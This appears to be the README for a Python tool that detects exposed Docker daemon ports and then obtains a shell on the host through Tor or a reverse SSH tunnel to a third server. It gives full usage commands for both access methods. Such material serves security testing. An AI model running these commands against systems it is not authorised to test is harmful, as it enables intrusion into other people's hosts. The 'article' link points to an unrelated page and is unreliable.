# Surena

Surena is a tool developed to assess vulnerabilities in Docker daemons when their ports are exposed to a TCP network. It is developed using Click, a Python CLI library, and the Docker SDK for Python. Surena demonstrates how a hacker can gain shell access from an insecure Docker host using two methods: Tor Network and SSH Reverse Tunneling. To explain how Surena works and how to use these methods, we have written an article on Medium that you can read by following this link: [article](https://github.com/facelessuser/wcmatch/issues).

## Installation

You can install Surena from PyPI by running the following command:

```bash
pip install surena
```

Once installed, you can run Surena using the following commands in your terminal. To view the available commands and options, use:

```bash
surena --help
```

Surena has two commands: `is-docker-host` and `get-docker-host`. The `is-docker-host` command is used for checking if the Docker daemon's port is accessible from the network. To understand its options, run the following command:

```bash
surena is-docker-host --help
```

For example, you can run this command with the following options:

```bash
surena is-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT
```

The `get-docker-host` command is used to gain shell access from the Docker daemon using two methods. To understand its options, run the following command:

```bash
surena get-docker-host --help
```

For example, to gain shell access using the Tor Network method, run this command with the following options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method tor
```

To gain shell access using the Reverse SSH Tunneling method, run this command with the following options:

```bash
surena get-docker-host --docker-host-address $DOCKER_HOST_IP --docker-host-port $DOCKER_HOST_PORT --access-method reverse-ssh --ssh-server-address $THIRD_SERVER_IP --ssh-server-username $THIRD_SERVER_USERNAME --ssh-server-password $THIRD_SERVER_PASSWORD --ssh-server-port $THIRD_SERVER_SSH_PORT
```

Please note that `$DOCKER_HOST_IP`, `$DOCKER_HOST_PORT`, `$THIRD_SERVER_IP`, `$THIRD_SERVER_USERNAME`, `$THIRD_SERVER_PASSWORD`, and `$THIRD_SERVER_SSH_PORT` should be replaced with the appropriate values.


Please note: Surena is intended for lab use and for understanding whether your Docker daemon is secure or insecure. DO NOT USE SURENA FOR MALICIOUS ACTIVITIES.

If Surena has helped you secure your infrastructure, particularly those utilizing Docker daemons over the network, we would be thrilled if you could consider supporting us by donating Dogecoin, Our Dogecoin wallet address for donations is: DRizEG8R6wW2cW5MNEAnERMMEMq6wupQMA
